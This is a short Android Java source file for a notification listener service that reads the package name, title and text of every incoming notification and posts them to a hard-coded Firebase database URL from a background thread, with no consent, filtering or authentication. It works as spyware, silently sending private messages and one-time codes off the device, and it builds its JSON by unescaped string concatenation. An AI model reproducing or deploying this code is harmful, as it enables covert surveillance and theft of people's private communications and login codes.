package com.notif.read;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Bundle;
import android.util.Log;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.OutputStream;

public class MyNotificationListener extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String pkg = sbn.getPackageName();
        Bundle extras = sbn.getNotification().extras;
        String title = extras.getString("android.title", "Empty");
        String text = extras.getCharSequence("android.text", "Empty").toString();

        // Background thread mein data Firebase bhejna
        new Thread(() -> {
            try {
                URL url = new URL("https://notifaction-reading-default-rtdb.firebaseio.com/logs.json");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                String json = "{\"appName\":\""+pkg+"\", \"title\":\""+title+"\", \"message\":\""+text+"\", \"time\":\""+new java.util.Date()+"\"}";
                OutputStream os = conn.getOutputStream();
                os.write(json.getBytes());
                os.flush();
                conn.getResponseCode();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }
}